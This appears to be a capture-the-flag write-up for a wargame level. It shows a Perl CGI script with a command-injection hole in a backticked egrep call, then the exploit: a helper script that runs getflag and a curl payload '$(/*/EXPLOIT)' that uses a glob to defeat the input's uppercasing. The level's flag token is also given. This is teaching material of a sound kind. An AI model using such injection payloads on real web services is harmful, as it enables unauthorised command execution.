- We have a perl script:
```bash
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```


----

- Whatever does this code it's not much important since we can see that the first parameter "x" we give to the script, it will be part of a exectuded command:
```bash
@output = `egrep "^$xx" /tmp/xd 2>&1`;

We can make a script that execute the getflag command and put it in /tmp/exploit. We will rename it EXPLOIT since the parameters are put into MAJ characters. => /tmp/EXPLOIT:

---
#!/bin/bash

getflag > /tmp/flag
---
The problem is that tmp will also get put into MAJ so the execution of my command will fail.
The trick here is to make a command that will search everywhere in the filesystem the file EXPLOIT to execute it. So we don't have to provide the tmp directory in parameter.

Payload:
curl http://localhost:4646/level12.pl?x='$(/*/EXPLOIT)' ; cat flag

Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
